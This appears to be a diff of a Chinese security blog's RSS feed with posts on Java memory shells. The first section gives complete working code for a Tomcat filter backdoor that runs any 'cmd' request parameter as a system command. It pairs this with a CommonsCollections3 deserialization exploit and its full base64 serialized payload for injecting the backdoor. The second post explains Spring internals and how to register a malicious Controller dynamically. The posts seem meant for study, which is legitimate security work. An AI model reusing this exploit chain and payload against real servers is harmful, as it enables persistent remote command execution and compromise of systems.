+        Context standardContext = resourceRoot.getContext();
+
+        try {
+            //获取ApplicationContext
+            Field application = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;context&quot;);
+            application.setAccessible(true);
+            ApplicationContext applicationContext = (ApplicationContext) application.get(standardContext);
+
+            //获取StandardService
+            Field Standard = Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredField(&quot;service&quot;);
+            Standard.setAccessible(true);
+            StandardService standardService = (StandardService) Standard.get(applicationContext);
+
+            //获取connectors
+            Field connectorfield = Class.forName(&quot;org.apache.catalina.core.StandardService&quot;).getDeclaredField(&quot;connectors&quot;);
+            connectorfield.setAccessible(true);
+            Connector[] connectors = (Connector[]) connectorfield.get(standardService);
+            Connector connector = connectors[0];
+
+            //获取到Http11NioProtocol ,通过Http11NioProtocol 获取到父类AbstractProtocol的属性
+            ProtocolHandler protocolHandler = connector.getProtocolHandler();
+            //反射获取ConnectionHandler
+            Field Connection_Handler = Class.forName(&quot;org.apache.coyote.AbstractProtocol&quot;).getDeclaredField(&quot;handler&quot;);
+            Connection_Handler.setAccessible(true);
+            org.apache.tomcat.util.net.AbstractEndpoint.Handler ConnectionHandler = (org.apache.tomcat.util.net.AbstractEndpoint.Handler) Connection_Handler.get(protocolHandler);
+
+            //获取global
+            Field global_field = Class.forName(&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;).getDeclaredField(&quot;global&quot;);
+            global_field.setAccessible(true);
+            RequestGroupInfo global = (RequestGroupInfo) global_field.get(ConnectionHandler);
+
+            //获取processors
+            Field processorsField = Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;).getDeclaredField(&quot;processors&quot;);
+            processorsField.setAccessible(true);
+            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);
+
+            //获取request
+            Field requestField = Class.forName(&quot;org.apache.coyote.RequestInfo&quot;).getDeclaredField(&quot;req&quot;);
+            requestField.setAccessible(true);
+            for (RequestInfo requestInfo : requestInfoList) {
+                org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo);
+
+                //通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request
+                org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);
+                request_cmd = http_request;
+                org.apache.catalina.connector.Response http_response = http_request.getResponse();
+            }
+
+
+            //注册Filter内存马
+            //这里为什么要再一次获取ServletContext
+            //因为第一次拿的 ApplicationContext 是通过 WebResourceRoot 拿的，
+            //可能是某个默认或者不确定的上下文，不一定就是当前请求的那个Web应用。
+            //而你要注册的 Filter 必须加到当前请求对应的 Web 应用里，否则不生效。
+            ServletContext servletContext_request = request_cmd.getServletContext();
+            java.lang.reflect.Field appContextField = servletContext_request.getClass().getDeclaredField(&quot;context&quot;);
+            appContextField.setAccessible(true);
+            ApplicationContext applicationContext2 = (ApplicationContext) appContextField.get(servletContext_request);
+            java.lang.reflect.Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
+            standardContextField.setAccessible(true);
+            StandardContext standardContext1 = (StandardContext) standardContextField.get(applicationContext2);
+
+            Filter_shell filter = new Filter_shell();
+            String name = &quot;shellfilter&quot;;
+
+            FilterDef filterDef = new FilterDef();
+            filterDef.setFilter(filter);
+            filterDef.setFilterName(name);
+            filterDef.setFilterClass(filter.getClass().getName());
+            standardContext1.addFilterDef(filterDef);
+
+            FilterMap filterMap = new FilterMap();
+            filterMap.addURLPattern(&quot;/*&quot;);
+            filterMap.setFilterName(name);
+            filterMap.setDispatcher(DispatcherType.REQUEST.name());
+            standardContext1.addFilterMapBefore(filterMap);
+
+            java.lang.reflect.Field configsField = standardContext1.getClass().getDeclaredField(&quot;filterConfigs&quot;);
+            configsField.setAccessible(true);
+            java.util.Map filterconfigs = (java.util.Map) configsField.get(standardContext1);
+
+            java.lang.reflect.Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(org.apache.catalina.Context.class, FilterDef.class);
+            constructor.setAccessible(true);
+            ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext1, filterDef);
+            filterconfigs.put(name, filterConfig);
+
+
+        } catch (Exception e) {
+            System.out.println(e.getMessage());
+        }
+    }
+
+
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+
+    }
+
+    @Override
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
+        //通过刚刚的方法我们已经把内存马直接注入到Tomcat中，然后在这个doFilter方法中，参数就会已经自动获取到request了，可以直接进行回显
+        String cmd = request.getParameter(&quot;cmd&quot;);
+        PrintWriter writer = response.getWriter();
+        if (cmd != null) {
+            try {
+                InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
+                //将命令执行结果写入扫描器并读取所有输入
+                java.util.Scanner scanner = new java.util.Scanner(in).useDelimiter(&quot;\\A&quot;);
+                String result = scanner.hasNext() ? scanner.next() : &quot;&quot;;
+                scanner.close();
+                writer.write(result);
+                writer.flush();
+                writer.close();
+
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            chain.doFilter(request, response);
+        }
+    }
+
+    @Override
+    public void destroy() {
+
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+</code></pre>
+<p>CC3：</p>
+<pre><code class="language-java">package Servlet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InstantiateTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import javax.xml.transform.Templates;
+import javax.xml.transform.TransformerConfigurationException;
+import java.io.*;
+import java.lang.reflect.*;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Arrays;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC3_EXP {
+    public static void main(String[] args) throws IllegalAccessException, IOException, NoSuchFieldException, TransformerConfigurationException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException {
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+
+        //满足getTransletInstance的条件
+        Field _name = templatesClass.getDeclaredField(&quot;_name&quot;);
+        _name.setAccessible(true);
+        _name.set(templates, &quot;Bloyet&quot;);
+        Field _class = templatesClass.getDeclaredField(&quot;_class&quot;);
+        _class.setAccessible(true);
+        _class.set(templates, null);
+
+        //满足defineTransletClasses的条件
+        byte[] _bytecodess = Files.readAllBytes(Paths.get(&quot;D:\\ideaproject\\untitled2\\target\\classes\\Filter\\Filter_shell.class&quot;));
+        byte[][] exp = new byte[][]{_bytecodess};
+        Field _tfactory = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        _tfactory.setAccessible(true);
+        _tfactory.set(templates, new TransformerFactoryImpl());
+        Field _bytecodess1 = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        _bytecodess1.setAccessible(true);
+        _bytecodess1.set(templates, exp);
+        //templates.newTransformer();
+        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
+        Transformer[] transformer = new Transformer[]{new ConstantTransformer(TrAXFilter.class), instantiateTransformer};
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformer);
+        //chainedTransformer.transform(1);
+        Map map = new HashMap();
+        Map decorMap = LazyMap.decorate(map, chainedTransformer);
+        Class cla = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constructor = cla.getDeclaredConstructor(Class.class, Map.class);//第一个参数为Class,第二个为Map类型
+        constructor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, decorMap);
+        Map newproxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);
+        Object o =constructor.newInstance(Override.class, newproxy);
+        serialize(o);
+
+        // 指定序列化文件路径
+        String filePath = &quot;D:\\out.obj&quot;;
+
+        // 读取文件为字节数组
+        byte[] fileBytes = readFileToBytes(filePath);
+
+        // 转换为Base64字符串
+        String payload = Base64.getEncoder().encodeToString(fileBytes);
+
+        // 输出或保存
+        System.out.println(payload);
+        byte[] bytes2= Base64.getDecoder().decode(payload);
+
+
+
+       // unserialize(&quot;D:\\out.obj&quot;);
+    }
+
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream out = new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;D:\\out.obj&quot;)));
+        out.writeObject(obj);
+    }
+
+    public static void unserialize(String filename) throws IOException, ClassNotFoundException {
+        ObjectInputStream out = new ObjectInputStream(Files.newInputStream(Paths.get(filename)));
+        out.readObject();
+    }
+    private static byte[] readFileToBytes(String filePath) throws IOException {
+        File file = new File(filePath);
+        try (FileInputStream fis = new FileInputStream(file);
+             ByteArrayOutputStream bos = new ByteArrayOutputStream()) {
+            byte[] buffer = new byte[1024];
+            int len;
+            while ((len = fis.read(buffer)) != -1) {
+                bos.write(buffer, 0, len);
+            }
+            return bos.toByteArray();
+        }
+
+}
+}
+</code></pre>
+<p>生成的payload：</p>
+<pre><code class="language-java">rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXB4cgAXamF2YS5sYW5nLnJlZmxlY3QuUHJveHnhJ9ogzBBDywIAAUwAAWh0ACVMamF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvbkhhbmRsZXI7eHBzcQB%2BAABzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAJzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB%2BABhMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP%2F%2F%2F%2F91cgADW1tCS%2F0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAF2sr%2Bur4AAAA0ADQKAAgAJAoAJQAmCAAnCgAlACgHACkKAAUAKgcAKwcALAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQALTHRleHQvaHR0cDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKQEAClNvdXJjZUZpbGUBAAlodHRwLmphdmEMAAkACgcALgwALwAwAQAEY2FsYwwAMQAyAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAMwAKAQAJdGV4dC9odHRwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAQAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAALAA0AAAAMAAEAAAAFAA4ADwAAAAEAEAARAAIACwAAAD8AAAADAAAAAbEAAAACAAwAAAAGAAEAAAAYAA0AAAAgAAMAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAFAAVAAIAFgAAAAQAAQAXAAEAEAAYAAIACwAAAEkAAAAEAAAAAbEAAAACAAwAAAAGAAEAAAAdAA0AAAAqAAQAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAGQAaAAIAAAABABsAHAADABYAAAAEAAEAFwAIAB0ACgABAAsAAABhAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAMADAAAABYABQAAAA4ACQASAAwAEAANABEAEQATAA0AAAAMAAEADQAEAB4AHwAAACAAAAAHAAJMBwAhBAABACIAAAACACNwdAAGQmxveWV0cHcBAHh1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAF2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA%2FQAAAAAAAAHcIAAAAEAAAAAB4eHZyABJqYXZhLmxhbmcuT3ZlcnJpZGUAAAAAAAAAAAAAAHhwcQB%2BAC0%3D
+</code></pre>
+<p>要发两次包 ，是因为cc链的缘故，第二次就可以成功将内存马注入了</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012947834_00051.png" alt="" /></p>
+<p>参考：</p>
+<p><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></p>
+<p><a href="https://stoocea.github.io/post/%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF.html">Tomcat型内存马回显以及反序列化写入 | stoocea’s blog</a></p>
+]]></description>
+    </item>
+    <item>
+      <title>Spring内存马</title>
+      <link>https://bloyet.github.io/post/spring-nei-cun-ma/</link>
+      <guid isPermaLink="true">https://bloyet.github.io/post/spring-nei-cun-ma/</guid>
+      <pubDate>Thu, 04 Sep 2025 01:29:34 +0800</pubDate>
+      <description><![CDATA[<p>在学习Spring内存马之前，作者打算好好恶补一下开发的基本知识，也算是给之前偷懒的自己补课吧</p>
+<p><a href="https://www.bilibili.com/video/BV12J411M7Sj/?spm_id_from=333.1387.collection.video_card.click&amp;vd_source=efb755bbe6728e721e5cf06c81e4366a">【狂神说Java】JavaWeb入门到实战_哔哩哔哩_bilibili</a></p>
+<p><a href="https://www.bilibili.com/video/BV1PE411i7CV/?vd_source=efb755bbe6728e721e5cf06c81e4366a">【狂神说Java】SpringBoot最新教程IDEA版通俗易懂_哔哩哔哩_bilibili</a></p>
+<h1 id="spring">Spring介绍</h1>
+<p>Spring是一个轻量级的Java开源框架，用于配置、管理和维护Bean（组件）的一种框架，其核心理念就是IOC(Inversion of Control,控制反转) 和 AOP(AspectOrientedProgramming， 面向切面编程)。</p>
+<p>重点讲解一下核心内容</p>
+<h2 id="ioc">IOC</h2>
+<p>IOC的中文翻译为：控制反转</p>
+<p>核心理念是：把对象的创建和管理权交给框架，而不是程序员手动去创建</p>
+<p>例如：</p>
+<p>不用IOC</p>
+<pre><code class="language-java">UserService userService = new UserServiceImpl(); // 程序员自己new对象
+</code></pre>
+<p>使用IOC</p>
+<p>使用这个注解，我们的框架会在运行的时候自动进行创建</p>
+<pre><code class="language-java">@Autowired
+UserService userService; // 交给 Spring 容器来注入，不用自己new
+</code></pre>
+<h2 id="aop">AOP</h2>
+<p>AOP（Aspect-Oriented Programming）是一种通过预定义的切点（Pointcut）和通知（Advice）将横切关注点（Cross-Cutting Concerns）模块化的编程范式。它允许开发者将与业务逻辑无关但对多个模块都很重要的功能（如日志记录、事务管理、安全控制等）从核心业务逻辑中分离出来，从而提高系统的模块化、可维护性和可重用性</p>
+<p>通俗一点来说，就是 AOP 是一种让你把“每个地方都要写的重复逻辑”（比如日志、安全）集中写一遍，然后自动织入方法执行过程中的技术。</p>
+<h2 id="springmvc">SpringMVC</h2>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012907403_00043.png" alt="" /></p>
+<p>客户端发送Request，DispatcherServlet(等同于Controller控制器)，控制器接收到请求，来到HandlerMapping（在配置文件中配置），HandlerMapping会对URL进行解析，并判断当前URL该交给哪个Controller来处理，找到对应的Controller之后，Controller就跟Server、JavaBean进行交互，得到某一个值，并返回一个视图（ModelAndView过程），Dispathcher通过ViewResolver视图解析器,找到ModelAndView对象指定的视图对象,最后，视图对象负责渲染返回给客户端。 SpringMVC 的核心点就是 <code>DispatchServlet</code></p>
+<h2 id="font-stylecolorrgb50-50-93applicationcontextfont"><font style="color:rgb(50, 50, 93);">ApplicationContext</font></h2>
+<p>Spring 框架中，<code>BeanFactory</code> 接口是 <code>Spring</code> IoC容器 的实际代表者</p>
+<p>Spring容器就是ApplicationContext，它是一个接口继承于BeanFactory，有很多实现类。获得了ApplicationContext的实例，就获得了IoC容器的引用。我们可以从ApplicationContext中可以根据Bean的ID获取Bean。</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012909203_00044.png" alt="" /></p>
+<p>因此，<code>org.springframework.context.ApplicationContext</code>接口也代表了 <code>IoC容器</code> ，它负责实例化、定位、配置应用程序中的对象(<code>bean</code>)及建立这些对象间(<code>beans</code>)的依赖。</p>
+<p>DispatchServlet是SpringMVC中的前端控制器，处理所有请求的核心组件，而它创建的是一个Child Context，是一个独立的IOC容器（web层使用）</p>
+<p>还有一个是Root ApplicationContext，它是全局的，责管理项目中非 Web 层的 Bean ，由 ContextLoaderListener 在项目启动时创建，负责加载和管理所有非 Web 层 Bean， 保存到 ServletContext 中供后续子容器共享。</p>
+<p>所有的 child 可以取访问 Root 容器，但是 Root 却不能去访问 Child 中的内容</p>
+<p>当然 是所有的context（不仅仅是Root） 的信息都是会存在ServletContext中的</p>
+<h1 id="controller">Controller型内存马</h1>
+<p>在 Spring 中，当我们<strong>静态注册一个 Controller</strong> 时，确实会<strong>指定一个类的某个方法</strong>处理特定路由；当请求到达这个路由时，Spring 会自动调用这个方法。这是 Spring MVC 的核心功能之一</p>
+<p>那么动态注册的时候也是一样的道理，只不过是由Spring自动完成，变成了我们手动去注册，当我们动态注册了一个恶意的controller，当我们访问指定路由的时候，就可以自动调用恶意方法，进行命令执行</p>
+<p>那么现在就是来看怎么进行动态注册恶意的controller</p>
+<h2 id="heading">思路：</h2>
+<p>获取当前上下文</p>
+<p>注册恶意Controller</p>
+<p>配置路径映射（其实在动态注册Controller的时候，就会进行映射器的配置）</p>
+<h2 id="heading-1">获取上下文</h2>
+<p>一共有四种方法可以获取到上下文：</p>
+<h3 id="getcurrentwebapplicationcontext">getCurrentWebApplicationContext</h3>
+<pre><code class="language-java">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
+</code></pre>
+<p><strong>getCurrentWebApplicationContext</strong> 获得的是一个 <strong>XmlWebApplicationContext</strong> 实例类型的 <strong>Root WebApplicationContext</strong></p>
+<h3 id="webapplicationcontextutils">WebApplicationContextUtils</h3>
+<pre><code class="language-java">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
+</code></pre>
+<p>通过这种方法获得的也是一个 <code>Root WebApplicationContext</code>。其中 <code>WebApplicationContextUtils.getWebApplicationContext</code> 函数也可以用 <code>WebApplicationContextUtils.getRequiredWebApplicationContext</code>来替换。</p>
+<h3 id="requestcontextutils">RequestContextUtils</h3>
+<pre><code class="language-java">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
+</code></pre>
+<p>通过 <code>ServletRequest</code> 类的实例来获得 <code>Child WebApplicationContext</code>。</p>
+<h3 id="font-stylecolorrgb50-50-93getattributefont"><strong><font style="color:rgb(50, 50, 93);">getAttribute</font></strong></h3>
+<pre><code class="language-java">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+</code></pre>
+<p>这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext</p>
+<h2 id="controller-1">注册恶意Controller</h2>
+<p>我们要想对Spring Controller 的动态注册，就是对<font style="color:#DF2A3F;"> RequestMappingHandlerMapping</font>注入的过程。</p>
+<p>RequestMappingHandlerMapping是springMVC里面的核心Bean，spring把我们的controller解析成RequestMappingInfo对象，然后再注册进RequestMappingHandlerMapping中，这样请求进来以后就可以根据请求地址调用到Controller类里面了。</p>
+<p>RequestMappingHandlerMapping对象本身是spring来管理的，可以通过**<font style="color:#DF2A3F;">ApplicationContext</font>**取到，所以并不需要我们新建</p>
+<p>而在SpringMVC框架下，会有两个ApplicationContext，</p>
+<p>一个是Spring IOC的上下文，这个是在java web框架的Listener里面配置，就是我们经常用的web.xml里面的org.springframework.web.context.ContextLoaderListener，由它来完成IOC容器的初始化和bean对象的注入。</p>
+<p>另外一个是ApplicationContext是由**<font style="color:#DF2A3F;">org.springframework.web.servlet.DispatcherServlet</font>**完成的，具体是在org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()这个方法做的。而这个过程里面会完成RequestMappingHandlerMapping这个对象的初始化。</p>
+<p>映射器： 它负责维护 <strong>URL 路径（或其他条件）到处理器（如 Controller 方法）的映射关系</strong>。</p>
+<p>Spring 2.5 开始到 Spring 3.1 之前一般使用<br />
+<code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code><br />
+映射器 ；</p>
+<p>Spring 3.1 开始及以后一般开始使用新的<br />
+<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code><br />
+映射器来支持@Contoller和@RequestMapping注解。</p>
+<h3 id="font-stylecolorrgb50-50-93registermappingfont"><font style="color:rgb(50, 50, 93);">registerMapping</font></h3>
+<p>在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012914081_00045.png" alt="" /></p>
+<p>在刚刚其实也说了 spring会把controller解析为RequestMappingInfo对象，然后在注册进RequestMappingHandlerMapping，所以我们可以看到在registerMapping方法中的参数，也是RequestMappingInfo类 所以在注册之前我们还需要看一下RequestMappingInfo类</p>
+<p>可以看到 构造方法是有非常多的参数的，但是有用的其实就两个 一共是</p>
+<pre><code class="language-java">private RequestMappingInfo(@Nullable String name, @Nullable PathPatternsRequestCondition pathPatternsCondition, @Nullable PatternsRequestCondition patternsCondition, RequestMethodsRequestCondition methodsCondition, ParamsRequestCondition paramsCondition, HeadersRequestCondition headersCondition, ConsumesRequestCondition consumesCondition, ProducesRequestCondition producesCondition, RequestConditionHolder customCondition, BuilderConfiguration options) {
+    Assert.isTrue(pathPatternsCondition != null || patternsCondition != null, &quot;Neither PathPatterns nor String patterns condition&quot;);
+    this.name = StringUtils.hasText(name) ? name : null;
+    this.pathPatternsCondition = pathPatternsCondition;
+    this.patternsCondition = patternsCondition;
+    this.methodsCondition = methodsCondition;
+    this.paramsCondition = paramsCondition;
+    this.headersCondition = headersCondition;
+    this.consumesCondition = consumesCondition;
+    this.producesCondition = producesCondition;
+    this.customConditionHolder = customCondition;
+    this.options = options;
+    this.hashCode = calculateHashCode(this.pathPatternsCondition, this.patternsCondition, this.methodsCondition, this.paramsCondition, this.headersCondition, this.consumesCondition, this.producesCondition, this.customConditionHolder);
+}
+</code></pre>
+<p>一个是指定controller的路径，也就是我们说的路由（设置好映射关系）</p>
+<p>另外一个是指定请求方式，设置为不限制就好</p>
+<p>registerMapping方法中的第二个参数，其实也就是我们对应的恶意类  第三个参数就是对应的恶意方法</p>
+<p>其实很好理解，RequestMappingInfo类指定我们恶意类的映射关系，使我们访问对应的路由时，就会对应一个类，而在MVC架构中，我们访问一个路由时，会自动调用一个方法的，那么这个方法，就是在这里进行指定的</p>
+<pre><code class="language-java">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例
+RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
+// 2. 通过反射获得自定义 controller 中唯一的 Method 对象
+Method method = 恶意类的字节码.getDeclaredMethods())[0];
+// 3. 定义访问 controller 的 URL 地址
+PatternsRequestCondition url = new PatternsRequestCondition(&quot;/hahaha&quot;);
+// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
+RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
+// 5. 在内存中动态注册 controller
+RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
+r.registerMapping(info, Class.forName(&quot;恶意Controller&quot;).newInstance(), method);
+</code></pre>
+<h3 id="font-stylecolorrgb85-85-85registerhandlerfont"><font style="color:rgb(85, 85, 85);">registerHandler</font></h3>
+<p><font style="color:rgb(85, 85, 85);">(版本古老，暂且就不复现了（：）<br />
+</font><font style="color:rgb(85, 85, 85);">参考上面的 HandlerMapping 接口继承关系图，针对使用 DefaultAnnotationHandlerMapping 映射器的应用，可以找到它继承的顶层类org.springframework.web.servlet.handler.AbstractUrlHandlerMapping<br />
+</font><font style="color:rgb(85, 85, 85);">在其registerHandler()方法中<br />
+</font><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012917940_00046.png" alt="" /><font style="color:rgb(85, 85, 85);"><br />
+</font><font style="color:rgb(85, 85, 85);">该方法接受 urlPath参数和 handler参数，可以在 this.getApplicationContext() 获得的上下文环境中寻找名字为 handler 参数值的 bean, 将 url 和 controller 实例 bean 注册到 handlerMap 中</font></p>
+<table>
+<thead>
+<tr>
